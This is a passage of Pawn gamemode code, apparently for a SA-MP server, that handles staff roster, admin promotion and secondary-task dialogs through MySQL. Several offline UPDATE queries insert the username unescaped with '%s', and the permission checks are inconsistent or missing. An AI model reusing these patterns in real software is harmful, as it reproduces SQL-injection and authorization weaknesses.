				if(listitem == 0) // Mods
				{
					mysql_tquery(MainPipeline, "SELECT `id`, `Username`, `AdminLevel`, `LastLogin`, `SeniorModerator`, `PAdmPromBy`, `PAdmPromDate`, `PAdmBanCount`, `PKickCount` FROM `accounts` WHERE `AdminLevel` = 1", "OnAdminRoster", "i", playerid);
				}
				if(listitem == 1) // Trial
				{
					mysql_tquery(MainPipeline, "SELECT `id`, `Username`, `AdminLevel`, `LastLogin`, `PAdmPromBy`, `PAdmPromDate`, `PAdmBanCount`, `PKickCount` FROM `accounts` WHERE `AdminLevel` = 2", "OnAdminRoster", "i", playerid);
				}
				if(listitem == 2) // General
				{
					mysql_tquery(MainPipeline, "SELECT `id`, `Username`, `AdminLevel`, `LastLogin`, `PAdmPromBy`, `PAdmPromDate`, `PAdmBanCount`, `PKickCount` FROM `accounts` WHERE `AdminLevel` = 3", "OnAdminRoster", "i", playerid);
				}
				if(listitem == 3) // Senior
				{
					mysql_tquery(MainPipeline, "SELECT `id`, `Username`, `AdminLevel`, `LastLogin`, `PAdmPromBy`, `PAdmPromDate`, `PAdmBanCount`, `PKickCount` FROM `accounts` WHERE `AdminLevel` = 4", "OnAdminRoster", "i", playerid);
				}
				if(listitem == 4) // Lead
				{
					mysql_tquery(MainPipeline, "SELECT `id`, `Username`, `AdminLevel`, `LastLogin`, `PAdmPromBy`, `PAdmPromDate`, `PAdmBanCount`, `PKickCount` FROM `accounts` WHERE `AdminLevel` = 1337", "OnAdminRoster", "i", playerid);
				}
				if(listitem == 5) // Executive Director
				{
					mysql_tquery(MainPipeline, "SELECT `id`, `Username`, `AdminLevel`, `LastLogin`, `PAdmPromBy`, `PAdmPromDate`, `PAdmBanCount`, `PKickCount` FROM `accounts` WHERE `AdminLevel` = 1338", "OnAdminRoster", "i", playerid);
				}
			}
			if(!response)
			{
			    ShowPlayerDialogEx(playerid, DISPLAY_ADMINISTRATION_ADMIN_MANAGE, DIALOG_STYLE_LIST, "{FF0606}Administration {FFFFFF}- Staff Section"
				, "Staff Roster\nAdjust Admin Level\nSet Secondary Task", "Select", "Cancel");
			}
			return 1;
		}
		case DISPLAY_ADMINISTRATION_ONOFF_PADMIN:
		{
			if(response)
			{
				if(listitem == 0) // Make/Edit/Remove an admin
				{
	   				ShowPlayerDialogEx(playerid, DISPLAY_ADMINISTRATION_MER_PADMIN, DIALOG_STYLE_INPUT, "{FF0606}Administration {FFFFFF}- Adjust Admin Level"
					, "{FFFFFF}Please input the player id you wish to adjust the admin rank", "Select", "Cancel");
				}
				if(listitem == 1) // offline Make/Edit/Remove an admin
				{
	   				ShowPlayerDialogEx(playerid, DISPLAY_ADMINISTRATION_OFFMER_PADMIN, DIALOG_STYLE_INPUT, "{FF0606}Administration {FFFFFF}- Adjust Admin Level"
					, "{FFFFFF}Please input the account name you wish to adjust the admin rank", "Select", "Cancel");
				}
			}
			if(!response)
			{
			    ShowPlayerDialogEx(playerid, DISPLAY_ADMINISTRATION_ADMIN_MANAGE, DIALOG_STYLE_LIST, "{FF0606}Administration {FFFFFF}- Staff Section"
				, "Staff Roster\nAdjust Admin Level\nSet Secondary Task", "Select", "Cancel");
			}
			return 1;
		}
        case DISPLAY_ADMINISTRATION_ONOFF_SETSEC:
		{
			if(response)
			{
				if(listitem == 0) // setsec
				{
	   				ShowPlayerDialogEx(playerid, DISPLAY_ADMINISTRATION_SETSEC, DIALOG_STYLE_INPUT, "{FF0606}Administration {FFFFFF}- Set Secondary Task"
					, "{FFFFFF}Please input the player id you wish to set secondary task", "Select", "Cancel");
				}
				if(listitem == 1) // offline setsec
				{
	   				ShowPlayerDialogEx(playerid, DISPLAY_ADMINISTRATION_OFFSETSEC, DIALOG_STYLE_INPUT, "{FF0606}Administration {FFFFFF}- Set Secondary Task"
					, "{FFFFFF}Please input the account name you wish to set secondary task", "Select", "Cancel");
				}
			}
			if(!response)
			{
			    ShowPlayerDialogEx(playerid, DISPLAY_ADMINISTRATION_ADMIN_MANAGE, DIALOG_STYLE_LIST, "{FF0606}Administration {FFFFFF}- Staff Section"
				, "Staff Roster\nAdjust Admin Level\nSet Secondary Task", "Select", "Cancel");
			}
			return 1;
		}
		case DISPLAY_ADMINISTRATION_SETSEC:
		{
		    new id = strval(inputtext);
		    if(PlayerInfo[id][pAdmin] < 2) return SendClientMessageEx(playerid, COLOR_GRAD1, "They are not an admin!");
			if(PlayerInfo[id][pStaffBanned] >= 1) return SendClientMessage(playerid, COLOR_WHITE, "That player is currently staff banned.");
		    if(!IsPlayerConnected(id) || !gPlayerLogged{id}) {
				SendClientMessageEx(playerid, COLOR_WHITE, "  The account you are trying to set secondary task is not connected!");
				return ShowPlayerDialogEx(playerid, DISPLAY_ADMINISTRATION_SETSEC, DIALOG_STYLE_INPUT, "{FF0606}Administration {FFFFFF}- Set Secondary Task"
					, "{FFFFFF}Please input the player id you wish to set secondary task", "Select", "Cancel");
			}
			if(response)
			{ 
 	 			if(!isnull(inputtext))
				{
					SetPVarInt(playerid, "SettingSec", id);
					ShowSetSec(playerid, id);
				}
				else
			    {
					ShowPlayerDialogEx(playerid, DISPLAY_ADMINISTRATION_SETSEC, DIALOG_STYLE_INPUT, "{FF0606}Administration {FFFFFF}- Set Secondary Task"
					, "{FFFFFF}Please input the player id you wish to set secondary task", "Select", "Cancel");
				}
			}
			if(!response)
			{
			    ShowPlayerDialogEx(playerid, DISPLAY_ADMINISTRATION_ONOFF_SETSEC, DIALOG_STYLE_LIST, "{FF0606}Administration {FFFFFF}- Set Secondary Task"
					, "Online\nOffline", "Select", "Cancel");
			}
			return 1;
		}
		case DISPLAY_ADMINISTRATION_OFFSETSEC:
		{
			if(response)
			{
 	 			if(!isnull(inputtext))
				{
				    new diagTitle[64], name[MAX_PLAYER_NAME];
				    format(name, MAX_PLAYER_NAME, inputtext);
					SetPVarString(playerid, "OfflineSettingSec", name);
					format(diagTitle, sizeof(diagTitle), "{FF0606}Administration {FFFFFF}-  Set Secondary Task for %s", name);
					ShowPlayerDialogEx(playerid, DIALOG_OFFSETSEC, DIALOG_STYLE_LIST, diagTitle, "Remove Secondary Task\nAdmin Personnel\nDirector of Admin Personnel\nFaction Moderator\nDirector of Faction Management\nGang Moderator\nDirector of Gang Management\nBusiness Moderator\nDirector of Business Management\nShop Technician\nSenior Shop Technician\nDirector of Community R\nBan Aappealer\nDirector of Community Inquiries\nSpecial Operative (Undercover)\nDirector of Special Operations\nPublic Relations\nDirector of Public Relations\nHuman Resources\nlevel 2 Human Resources\nlevel 3 Human Resources\nSecurity\nAssistant Shift Manager", "Select", "Cancel");
				}
				else
			    {
					ShowPlayerDialogEx(playerid, DISPLAY_ADMINISTRATION_OFFSETSEC, DIALOG_STYLE_INPUT, "{FF0606}Administration {FFFFFF}- Set Secondary Task"
					, "{FFFFFF}Please input the account name you wish to set secondary task", "Select", "Cancel");
				}
			}
			if(!response)
			{
			    ShowPlayerDialogEx(playerid, DISPLAY_ADMINISTRATION_ONOFF_SETSEC, DIALOG_STYLE_LIST, "{FF0606}Administration {FFFFFF}- Set Secondary Task"
					, "Online\nOffline", "Select", "Cancel");
			}
			return 1;
		}
		case DISPLAY_ADMINISTRATION_MER_PADMIN:
		{
		    new id = strval(inputtext);
		    if(PlayerInfo[id][pHelper] >= 1) return SendClientMessageEx(playerid, COLOR_GRAD1, "You cannot make Advisors admins!");
			if(PlayerInfo[id][pStaffBanned] >= 1) return SendClientMessage(playerid, COLOR_WHITE, "That player is currently staff banned.");
		    if(!IsPlayerConnected(id) || !gPlayerLogged{id}) {
				SendClientMessageEx(playerid, COLOR_WHITE, "  The account you are trying to adjust the admin rank is not connected!");
				return ShowPlayerDialogEx(playerid, DISPLAY_ADMINISTRATION_MER_PADMIN, DIALOG_STYLE_INPUT, "{FF0606}Administration {FFFFFF}- Adjust Admin Level", "{FFFFFF}Please input the player id you wish to adjust the admin rank", "Select", "Cancel");
			}
			if(response)
			{
 	 			if(!isnull(inputtext))
				{
				    new diagTitle[64 + MAX_PLAYER_NAME];
					SetPVarInt(playerid, "MakingAdmin", id);
					format(diagTitle, sizeof(diagTitle), "{FF0606}Administration {FFFFFF}- Adjust Admin Level for %s", GetPlayerNameEx(id));
					ShowPlayerDialogEx(playerid, DIALOG_MAKEADMIN, DIALOG_STYLE_LIST, diagTitle, "{FFFFFF}Remove Admin Level\n{FFFF00}Moderator\n{87CEEB}Trial Administrator\n{00FF00}General Administrator\n{FFA500}Senior Administrator\n{e80c0c}Lead Administrator\n{298EFF}Executive Director", "Select", "Cancel");
				}
				else
			    {
					ShowPlayerDialogEx(playerid, DISPLAY_ADMINISTRATION_MER_PADMIN, DIALOG_STYLE_INPUT, "{FF0606}Administration {FFFFFF}- Adjust Admin Level"
					, "{FFFFFF}Please input the player id you wish to adjust the admin rank", "Select", "Cancel");
				}
			}
			if(!response)
			{
			    ShowPlayerDialogEx(playerid, DISPLAY_ADMINISTRATION_ONOFF_PADMIN, DIALOG_STYLE_LIST, "{FF0606}Administration {FFFFFF}- Adjust Admin Level", "Online\nOffline", "Select", "Cancel");
			}
			return 1;
		}
		case DISPLAY_ADMINISTRATION_OFFMER_PADMIN:
		{
			if(response)
			{
 	 			if(!isnull(inputtext))
				{
					new string[128];
					mysql_format(MainPipeline, string, sizeof(string), "SELECT `id` FROM `accounts` WHERE `Username` = '%e'", inputtext);
					mysql_tquery(MainPipeline, string, "OnOffMakeAdmin", "is", playerid, inputtext);
					
				}
				else
			    {
					ShowPlayerDialogEx(playerid, DISPLAY_ADMINISTRATION_OFFMER_PADMIN, DIALOG_STYLE_INPUT, "{FF0606}Administration {FFFFFF}- Adjust Admin Level"
					, "{FFFFFF}Please input the account name you wish to adjust the admin rank", "Select", "Cancel");
				}
			}
			if(!response)
			{
			    ShowPlayerDialogEx(playerid, DISPLAY_ADMINISTRATION_ONOFF_PADMIN, DIALOG_STYLE_LIST, "{FF0606}Administration {FFFFFF}- Adjust Admin Level", "Online\nOffline", "Select", "Cancel");
			}
			return 1;
		}
		case DIALOG_OFFMAKEADMIN:
		{
			if (PlayerInfo[playerid][pAdmin] >= 1338 || PlayerInfo[playerid][pHR] >= 2)
			{
			    new
						iTargetName[24], string[128], szQuery[128];
				GetPVarString(playerid, "OfflineMakingAdmin", iTargetName, 24);
				if(response) switch(listitem)
				{
     				case 0:
					{
					    mysql_format(MainPipeline, szQuery, sizeof(szQuery), "UPDATE `accounts` SET `AdminLevel` = 0 WHERE `Username` = '%s'", iTargetName);
						mysql_tquery(MainPipeline, szQuery, "OnQueryFinish", "i", SENDDATA_THREAD);
						format(string, sizeof(string), "You have removed %s from the admin team.(Offline)", iTargetName);
						SendClientMessageEx(playerid, COLOR_LIGHTBLUE, string);
						format(string, sizeof(string),  "AdmCmd: %s has removed %s's administrator rank.(Offline)", GetPlayerNameEx(playerid), iTargetName);
						ABroadCast(COLOR_LIGHTRED, string, 2);
						Log("logs/admin.log", string);
					}
					case 1:
					{
					    mysql_format(MainPipeline, szQuery, sizeof(szQuery), "UPDATE `accounts` SET `AdminLevel` = 1 WHERE `Username` = '%s'", iTargetName);
						mysql_tquery(MainPipeline, szQuery, "OnQueryFinish", "i", SENDDATA_THREAD);
						format(string, sizeof(string), "You have made %s a Server Moderator.(Offline)", iTargetName);
						SendClientMessageEx(playerid, COLOR_LIGHTBLUE, string);
						format(string, sizeof(string),  "AdmCmd: %s has made %s a Server Moderator.(Offline)", GetPlayerNameEx(playerid), iTargetName);
						ABroadCast(COLOR_LIGHTRED, string, 2);
						Log("logs/admin.log", string);
					}
					case 2:
					{
					    mysql_format(MainPipeline, szQuery, sizeof(szQuery), "UPDATE `accounts` SET `AdminLevel` = 2 WHERE `Username` = '%s'", iTargetName);
						mysql_tquery(MainPipeline, szQuery, "OnQueryFinish", "i", SENDDATA_THREAD);
						format(string, sizeof(string), "You have made %s a Trial Administrator.(Offline)", iTargetName);
						SendClientMessageEx(playerid, COLOR_LIGHTBLUE, string);
						format(string, sizeof(string),  "AdmCmd: %s has made %s a Trial Administrator.(Offline)", GetPlayerNameEx(playerid), iTargetName);
						ABroadCast(COLOR_LIGHTRED, string, 2);
						Log("logs/admin.log", string);
					}
					case 3:
                    {
					    mysql_format(MainPipeline, szQuery, sizeof(szQuery), "UPDATE `accounts` SET `AdminLevel` = 3, `PAdmPromDate` = NOW(), `PAdmPromBy` = '%s' WHERE `Username` = '%s'", GetPlayerNameEx(playerid),  iTargetName, iTargetName);
						mysql_tquery(MainPipeline, szQuery, "OnQueryFinish", "i", SENDDATA_THREAD);
						format(string, sizeof(string), "You have made %s a General Administrator.(Offline)", iTargetName);
						SendClientMessageEx(playerid, COLOR_LIGHTBLUE, string);
						format(string, sizeof(string),  "AdmCmd: %s has made %s a General Administrator.(Offline)", GetPlayerNameEx(playerid), iTargetName);
						ABroadCast(COLOR_LIGHTRED, string, 2);
						Log("logs/admin.log", string);
					}
					case 4:
                    {
					    mysql_format(MainPipeline, szQuery, sizeof(szQuery), "UPDATE `accounts` SET `AdminLevel` = 4 WHERE `Username` = '%s'", iTargetName);
						mysql_tquery(MainPipeline, szQuery, "OnQueryFinish", "i", SENDDATA_THREAD);
						format(string, sizeof(string), "You have made %s a Senior Administrator.(Offline)", iTargetName);
						SendClientMessageEx(playerid, COLOR_LIGHTBLUE, string);
						format(string, sizeof(string),  "AdmCmd: %s has made %s a Senior Administrator.(Offline)", GetPlayerNameEx(playerid), iTargetName);
						ABroadCast(COLOR_LIGHTRED, string, 2);
						Log("logs/admin.log", string);
					}
					case 5:
                    {
					    mysql_format(MainPipeline, szQuery, sizeof(szQuery), "UPDATE `accounts` SET `AdminLevel` = 1337 WHERE `Username` = '%s'", iTargetName);
						mysql_tquery(MainPipeline, szQuery, "OnQueryFinish", "i", SENDDATA_THREAD);
						format(string, sizeof(string), "You have made %s a Lead Administrator.(Offline)", iTargetName);
						SendClientMessageEx(playerid, COLOR_LIGHTBLUE, string);
						format(string, sizeof(string),  "AdmCmd: %s has made %s a Lead Administrator.(Offline)", GetPlayerNameEx(playerid), iTargetName);
						ABroadCast(COLOR_LIGHTRED, string, 2);
						Log("logs/admin.log", string);
					}
					case 6:
                    {
					    mysql_format(MainPipeline, szQuery, sizeof(szQuery), "UPDATE `accounts` SET `AdminLevel` = 1338 WHERE `Username` = '%s'", iTargetName);
						mysql_tquery(MainPipeline, szQuery, "OnQueryFinish", "i", SENDDATA_THREAD);
						format(string, sizeof(string), "You have made %s a Executive Director.(Offline)", iTargetName);
						SendClientMessageEx(playerid, COLOR_LIGHTBLUE, string);
						format(string, sizeof(string),  "AdmCmd: %s has made %s a Executive Director.(Offline)", GetPlayerNameEx(playerid), iTargetName);
						ABroadCast(COLOR_LIGHTRED, string, 2);
						Log("logs/admin.log", string);
					}
				}
				if(!response)
				{
					DeletePVar(playerid, "OfflineMakingAdmin");
					return ShowPlayerDialogEx(playerid, DISPLAY_ADMINISTRATION_OFFMER_PADMIN, DIALOG_STYLE_INPUT, "{FF0606}Administration {FFFFFF}- Adjust Admin Level", "{FFFFFF}Please input the account name you wish to adjust the admin rank", "Select", "Cancel");
				}
			}
			else SendClientMessageEx(playerid, COLOR_GRAD2, "You do not have access to this.");
		}
	    case DIALOG_MAKEADMIN:
		{
			if (PlayerInfo[playerid][pAdminLevel] >= 1337 || PlayerInfo[playerid][pHR] >= 2)
			{
			    new
						iTargetID = GetPVarInt(playerid, "MakingAdmin"), string[128];

				if(response) switch(listitem)
				{
     				case 0:
					{
					    
                        if(PlayerInfo[iTargetID][pAdminLevel] == 0) return SendClientMessageEx(playerid, COLOR_GREY, "This person already has this administrator level.");
                        else
						{
							SetAdminLevel(playerid, iTargetID, 0);
						    format(string, sizeof(string), "Your administrator rank has been removed by %s.", GetPlayerNameEx(playerid));
							SendClientMessageEx(iTargetID, COLOR_LIGHTBLUE, string);
							format(string, sizeof(string), "You have removed %s from the admin team.", GetPlayerNameEx(iTargetID));
							SendClientMessageEx(playerid, COLOR_LIGHTBLUE, string);
							format(string, sizeof(string),  "AdmCmd: %s has removed %s's administrator rank.", GetPlayerNameEx(playerid), GetPlayerNameEx(iTargetID));
							ABroadCast(COLOR_LIGHTRED, string, 2);
							Log("logs/admin.log", string);
							format(szMiscArray, sizeof(szMiscArray), "%s was removed from admin team by %s", GetPlayerNameEx(iTargetID), GetPlayerNameEx(playerid));
							DBLog(playerid, iTargetID, "Admin", szMiscArray);
						}
					}
					case 1:
					{
                        if(PlayerInfo[iTargetID][pAdminLevel] == 1) return SendClientMessageEx(playerid, COLOR_GREY, "This person already has this administrator level.");
                        else
						{
							SetAdminLevel(playerid, iTargetID, 1);
						    format(string, sizeof(string), "You have been made a Server Moderator by %s.", GetPlayerNameEx(playerid));
							SendClientMessageEx(iTargetID, COLOR_LIGHTBLUE, string);
							format(string, sizeof(string), "You have made %s a Server Moderator.", GetPlayerNameEx(iTargetID));
							SendClientMessageEx(playerid, COLOR_LIGHTBLUE, string);
							format(string, sizeof(string),  "AdmCmd: %s has made %s a Server Moderator.", GetPlayerNameEx(playerid), GetPlayerNameEx(iTargetID));
							ABroadCast(COLOR_LIGHTRED, string, 2);
							Log("logs/admin.log", string);
							format(szMiscArray, sizeof(szMiscArray), "%s was made a Server Moderator by %s", GetPlayerNameEx(iTargetID), GetPlayerNameEx(playerid));
							DBLog(playerid, iTargetID, "Admin", szMiscArray);
						}
					}
					case 2:
					{
                        if(PlayerInfo[iTargetID][pAdminLevel] == 2) return SendClientMessageEx(playerid, COLOR_GREY, "This person already has this administrator level.");
                        else
						{
						    SetAdminLevel(playerid, iTargetID, 2);
						    format(string, sizeof(string), "You have been made a Trial Administrator by %s.", GetPlayerNameEx(playerid));
							SendClientMessageEx(iTargetID, COLOR_LIGHTBLUE, string);
							format(string, sizeof(string), "You have made %s a Trial Administrator.", GetPlayerNameEx(iTargetID));
							SendClientMessageEx(playerid, COLOR_LIGHTBLUE, string);
							format(string, sizeof(string),  "AdmCmd: %s has made %s a Trial Administrator.", GetPlayerNameEx(playerid), GetPlayerNameEx(iTargetID));
							ABroadCast(COLOR_LIGHTRED, string, 2);
							Log("logs/admin.log", string);
							format(szMiscArray, sizeof(szMiscArray), "%s was made a Trial Administrator by %s", GetPlayerNameEx(iTargetID), GetPlayerNameEx(playerid));
							DBLog(playerid, iTargetID, "Admin", szMiscArray);
						}
					}
					case 3:
                    {
                        if(PlayerInfo[iTargetID][pAdminLevel] == 3) return SendClientMessageEx(playerid, COLOR_GREY, "This person already has this administrator level.");
                        else
						{
						    SetAdminLevel(playerid, iTargetID, 3);
						    format(string, sizeof(string), "You have been made a General Administrator by %s.", GetPlayerNameEx(playerid));
							SendClientMessageEx(iTargetID, COLOR_LIGHTBLUE, string);
							format(string, sizeof(string), "You have made %s a General Administrator.", GetPlayerNameEx(iTargetID));
							SendClientMessageEx(playerid, COLOR_LIGHTBLUE, string);
							format(string, sizeof(string),  "AdmCmd: %s has made %s a General Administrator.", GetPlayerNameEx(playerid), GetPlayerNameEx(iTargetID));
							ABroadCast(COLOR_LIGHTRED, string, 2);
							Log("logs/admin.log", string);
							format(szMiscArray, sizeof(szMiscArray), "%s was made a General Administrator by %s", GetPlayerNameEx(iTargetID), GetPlayerNameEx(playerid));
							DBLog(playerid, iTargetID, "Admin", szMiscArray);
						}
					}
					case 4:
                    {
                        if(PlayerInfo[iTargetID][pAdminLevel] == 4) return SendClientMessageEx(playerid, COLOR_GREY, "This person already has this administrator level.");
                        else
						{
						    SetAdminLevel(playerid, iTargetID, 4);
						    format(string, sizeof(string), "You have been made a Senior Administrator by %s.", GetPlayerNameEx(playerid));
							SendClientMessageEx(iTargetID, COLOR_LIGHTBLUE, string);
							format(string, sizeof(string), "You have made %s a Senior Administrator.", GetPlayerNameEx(iTargetID));
							SendClientMessageEx(playerid, COLOR_LIGHTBLUE, string);
							format(string, sizeof(string),  "AdmCmd: %s has made %s a Senior Administrator.", GetPlayerNameEx(playerid), GetPlayerNameEx(iTargetID));
							ABroadCast(COLOR_LIGHTRED, string, 2);
							Log("logs/admin.log", string);
							format(szMiscArray, sizeof(szMiscArray), "%s was made a Senior Administrator by %s", GetPlayerNameEx(iTargetID), GetPlayerNameEx(playerid));
							DBLog(playerid, iTargetID, "Admin", szMiscArray);
						}
					}
					case 5:
                    {
                        if(PlayerInfo[iTargetID][pAdminLevel] == 1337) return SendClientMessageEx(playerid, COLOR_GREY, "This person already has this administrator level.");
                        else
						{
						    SetAdminLevel(playerid, iTargetID, 1337);
						    format(string, sizeof(string), "You have been made a Lead Administrator by %s.", GetPlayerNameEx(playerid));
							SendClientMessageEx(iTargetID, COLOR_LIGHTBLUE, string);
							format(string, sizeof(string), "You have made %s a Lead Administrator.", GetPlayerNameEx(iTargetID));
							SendClientMessageEx(playerid, COLOR_LIGHTBLUE, string);
							format(string, sizeof(string),  "AdmCmd: %s has made %s a Lead Administrator.", GetPlayerNameEx(playerid), GetPlayerNameEx(iTargetID));
							ABroadCast(COLOR_LIGHTRED, string, 2);
							Log("logs/admin.log", string);
							format(szMiscArray, sizeof(szMiscArray), "%s was made a Lead Administrator by %s", GetPlayerNameEx(iTargetID), GetPlayerNameEx(playerid));
							DBLog(playerid, iTargetID, "Admin", szMiscArray);
						}
					}
					case 6:
                    {
                        if(PlayerInfo[iTargetID][pAdminLevel] == 1338) return SendClientMessageEx(playerid, COLOR_GREY, "This person already has this administrator level.");
                        else
						{
						    SetAdminLevel(playerid, iTargetID, 1338);
						    format(string, sizeof(string), "You have been made a Executive Director by %s.", GetPlayerNameEx(playerid));
							SendClientMessageEx(iTargetID, COLOR_LIGHTBLUE, string);
							format(string, sizeof(string), "You have made %s a Executive Director.", GetPlayerNameEx(iTargetID));
							SendClientMessageEx(playerid, COLOR_LIGHTBLUE, string);
							format(string, sizeof(string),  "AdmCmd: %s has made %s a Executive Director.", GetPlayerNameEx(playerid), GetPlayerNameEx(iTargetID));
							ABroadCast(COLOR_LIGHTRED, string, 2);
							Log("logs/admin.log", string);
							format(szMiscArray, sizeof(szMiscArray), "%s was made a Executive Director by %s", GetPlayerNameEx(iTargetID), GetPlayerNameEx(playerid));
							DBLog(playerid, iTargetID, "Admin", szMiscArray);

						}
					}
				}
				if(!response)
				{
					DeletePVar(playerid, "MakingAdmin");
					/*return ShowPlayerDialogEx(playerid, DISPLAY_ADMINISTRATION_MER_PADMIN, DIALOG_STYLE_INPUT, "{FF0606}Administration {FFFFFF}- Adjust Admin Level"
					, "{FFFFFF}Please input the player id you wish to adjust the admin rank", "Select", "Cancel");*/
				}
			}
			else SendClientMessageEx(playerid, COLOR_GRAD2, "You do not have access to this.");
		}
		case DIALOG_SETSEC:
		{
			if(response) 
			{
				new giveplayerid = GetPVarInt(playerid, "SettingSec"), string[128];		
	
				switch(listitem)
				{
					case 0:
					{
							PlayerInfo[giveplayerid][pAP] = 0;
							PlayerInfo[giveplayerid][pFactionModerator] = 0;
							PlayerInfo[giveplayerid][pGangModerator] = 0;
							PlayerInfo[giveplayerid][pBM] = 0;
							PlayerInfo[giveplayerid][pShopTech] = 0;
							PlayerInfo[giveplayerid][pBanAppealer] = 0;
							PlayerInfo[giveplayerid][pUndercover] = 0;
							PlayerInfo[giveplayerid][pPR] = 0;
							PlayerInfo[giveplayerid][pHR] = 0;
							PlayerInfo[giveplayerid][pSecurity] = 0;
							PlayerInfo[giveplayerid][pASM] = 0;
							SendServerMessage(playerid, "You have taken their Secondary Task");
							SendServerMessage(giveplayerid, "You have had your Secondary Task tasken");
							format(string, sizeof(string), "%s has taken Secondary Task from %s", GetPlayerNameEx(playerid), GetPlayerNameEx(giveplayerid));
							Log("logs/admin.log", string);
							DBLog(playerid, giveplayerid, "Admin", "removed his Secondary Task");
							ShowSetSec(playerid, giveplayerid);
					}
					case 1:
					{
						if(PlayerInfo[giveplayerid][pAP] == 0)
						{
							PlayerInfo[giveplayerid][pAP] = 1;
							SendServerMessage(playerid, "You have made them an Admin Personel");
							SendServerMessage(giveplayerid, "You have been made an Admin Personel");
							format(string, sizeof(string), "%s has given Admin Personel to %s", GetPlayerNameEx(playerid), GetPlayerNameEx(giveplayerid));
							Log("logs/admin.log", string);
							DBLog(playerid, giveplayerid, "Admin", "issued Admin Personel");
						}
						else
						{
							PlayerInfo[giveplayerid][pAP] = 0;
							SendServerMessage(playerid, "You have taken their Admin Personel");
							SendServerMessage(giveplayerid, "You have had your Admin Personel taken");
							format(string, sizeof(string), "%s has taken Admin Personel from %s", GetPlayerNameEx(playerid), GetPlayerNameEx(giveplayerid));
							Log("logs/admin.log", string);
							DBLog(playerid, giveplayerid, "Admin", "removed from Admin Personel");
						}
						ShowSetSec(playerid, giveplayerid);
					}
					case 2:
					{
						if(PlayerInfo[giveplayerid][pAP] == 0)
						{
							PlayerInfo[giveplayerid][pAP] = 2;
							SendServerMessage(playerid, "You have made them a DoAP");
							SendServerMessage(giveplayerid, "You have been made a DoAP");
							format(string, sizeof(string), "%s has given DoAP to %s", GetPlayerNameEx(playerid), GetPlayerNameEx(giveplayerid));
							Log("logs/admin.log", string);
							DBLog(playerid, giveplayerid, "Admin", "issued DoAP");
						}
						else
						{
							PlayerInfo[giveplayerid][pAP] = 0;
							SendServerMessage(playerid, "You have taken their DoAP");
							SendServerMessage(giveplayerid, "You have had your DoAP taken");
							format(string, sizeof(string), "%s has taken DoAP from %s", GetPlayerNameEx(playerid), GetPlayerNameEx(giveplayerid));
							Log("logs/admin.log", string);
							DBLog(playerid, giveplayerid, "Admin", "removed from DoAP");
						}
						ShowSetSec(playerid, giveplayerid);
					}
					case 3:
					{
						if(PlayerInfo[giveplayerid][pFactionModerator] == 0)
						{
							PlayerInfo[giveplayerid][pFactionModerator] = 1;
							SendServerMessage(playerid, "You have made them a Faction Moderator");
							SendServerMessage(giveplayerid, "You have been made a Faction Moderator");
							format(string, sizeof(string), "%s has given Faction Moderator to %s", GetPlayerNameEx(playerid), GetPlayerNameEx(giveplayerid));
							Log("logs/admin.log", string);
							DBLog(playerid, giveplayerid, "Admin", "issued faction moderator");
						}
						else
						{
							PlayerInfo[giveplayerid][pFactionModerator] = 0;
							SendServerMessage(playerid, "You have taken their Faction Moderator");
							SendServerMessage(giveplayerid, "You have had your Faction Moderator taken");
							format(string, sizeof(string), "%s has taken Faction Moderator from %s", GetPlayerNameEx(playerid), GetPlayerNameEx(giveplayerid));
							Log("logs/admin.log", string);
							DBLog(playerid, giveplayerid, "Admin", "removed from faction moderator");
						}
						ShowSetSec(playerid, giveplayerid);
					}
					case 4:
					{
						if(PlayerInfo[giveplayerid][pFactionModerator] == 0)
						{
							PlayerInfo[giveplayerid][pFactionModerator] = 2;
							SendServerMessage(playerid, "You have made them a Director of Faction Management");
							SendServerMessage(giveplayerid, "You have been made a Director of Faction Management");
							format(string, sizeof(string), "%s has given Director of Faction Management to %s", GetPlayerNameEx(playerid), GetPlayerNameEx(giveplayerid));
							Log("logs/admin.log", string);
							DBLog(playerid, giveplayerid, "Admin", "issued Director of Faction Management");
						}
						else
						{
							PlayerInfo[giveplayerid][pFactionModerator] = 0;
							SendServerMessage(playerid, "You have taken their Director of Faction Management");
							SendServerMessage(giveplayerid, "You have had your Director of Faction Management taken");
							format(string, sizeof(string), "%s has taken Director of Faction Management from %s", GetPlayerNameEx(playerid), GetPlayerNameEx(giveplayerid));
							Log("logs/admin.log", string);
							DBLog(playerid, giveplayerid, "Admin", "removed from Director of Faction Management");
						}
						ShowSetSec(playerid, giveplayerid);
					}
					case 5:
					{
						if(PlayerInfo[giveplayerid][pGangModerator] == 0)
						{
							PlayerInfo[giveplayerid][pGangModerator] = 1;
							SendServerMessage(playerid, "You have made them a Gang Moderator");
							SendServerMessage(giveplayerid, "You have been made a Gang Moderator");
							format(string, sizeof(string), "%s has given Gang Moderator to %s", GetPlayerNameEx(playerid), GetPlayerNameEx(giveplayerid));
							Log("logs/admin.log", string);
							DBLog(playerid, giveplayerid, "Admin", "issued gang moderator");
						}
						else
						{
							PlayerInfo[giveplayerid][pGangModerator] = 0;
							SendServerMessage(playerid, "You have taken their Gang Moderator");
							SendServerMessage(giveplayerid, "You have had your Gang Moderator taken");
							format(string, sizeof(string), "%s has taken Gang Moderator from %s", GetPlayerNameEx(playerid), GetPlayerNameEx(giveplayerid));
							Log("logs/admin.log", string);
							DBLog(playerid, giveplayerid, "Admin", "removed from gang moderator");
						}
						ShowSetSec(playerid, giveplayerid);			
					}
					case 6:
					{
						if(PlayerInfo[giveplayerid][pGangModerator] == 0)
						{
							PlayerInfo[giveplayerid][pGangModerator] = 2;
							SendServerMessage(playerid, "You have made them a Director of Gang Management");
							SendServerMessage(giveplayerid, "You have been made a Director of Gang Management");
							format(string, sizeof(string), "%s has given Director of Gang Management to %s", GetPlayerNameEx(playerid), GetPlayerNameEx(giveplayerid));
							Log("logs/admin.log", string);
							DBLog(playerid, giveplayerid, "Admin", "issued Director of Gang Management");
						}
						else
						{
							PlayerInfo[giveplayerid][pGangModerator] = 0;
							SendServerMessage(playerid, "You have taken their Director of Gang Management");
							SendServerMessage(giveplayerid, "You have had your Director of Gang Management taken");
							format(string, sizeof(string), "%s has taken Director of Gang Management from %s", GetPlayerNameEx(playerid), GetPlayerNameEx(giveplayerid));
							Log("logs/admin.log", string);
							DBLog(playerid, giveplayerid, "Admin", "removed from Director of Gang Management");
						}
						ShowSetSec(playerid, giveplayerid);
					}
					case 7:
					{
							if(PlayerInfo[giveplayerid][pBM] == 0  || PlayerInfo[giveplayerid][pBM] == 2)
							{
								PlayerInfo[giveplayerid][pBM] = 1;
								SendServerMessage(playerid, "You have made them a Business Moderator");
								SendServerMessage(giveplayerid, "You have been made a Business Moderator");
